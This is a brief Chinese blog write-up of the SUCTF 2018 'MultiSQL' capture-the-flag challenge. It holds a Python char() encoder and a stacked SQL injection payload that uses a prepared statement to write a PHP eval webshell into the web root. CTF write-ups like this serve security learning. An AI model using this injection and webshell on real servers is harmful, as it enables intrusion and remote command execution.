---
title: '[SUCTF 2018]MultiSQL'
author: Troy3e
avatar: 'https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/avatar.jpg'
authorAbout: steamID：888007034
authorDesc: 'Blizzard：TroyeSivan#51769'
categories: 技术
comments: true
date: 2020-11-18 22:27:00
authorLink:
tags:
keywords:
description:
photos: https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1113336.jpg
---
[SUCTF 2018]MultiSQL

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/QQ%E5%9B%BE%E7%89%8720201118131923.png)

注册登陆界面似乎并不存在sql注入，上面留言板啥的都是摆设，然后试了下编辑信息那里的一个头像上传，没法解析，所以也不行。
最后发现一个可疑的注入点，user.php?id=3，还是在个人信息那里，首先试了下1^1^1,成功返回admin。
简单测试发现过滤了union，select ，&，|，substr。
存在堆叠注入，用chrar()绕过过滤，再用预处理语句执行。

str="select '<?php eval($_POST[_]);?>' into outfile '/var/www/html/favicon/shell.php';"
len_str=len(str)
for i in range(0,len_str):
	if i == 0:
		print('char(%s'%ord(str[i]),end="")
	else:
		print(',%s'%ord(str[i]),end="")
print(')')


?id=2;set @sql=char(115,101,108,101,99,116,32,39,60,63,112,104,112,32,101,118,97,108,40,36,95,80,79,83,84,91,95,93,41,59,63,62,39,32,105,110,116,111,32,111,117,116,102,105,108,101,32,39,47,118,97,114,47,119,119,119,47,104,116,109,108,47,102,97,118,105,99,111,110,47,115,104,101,108,108,46,112,104,112,39,59);prepare query from @sql;execute query;


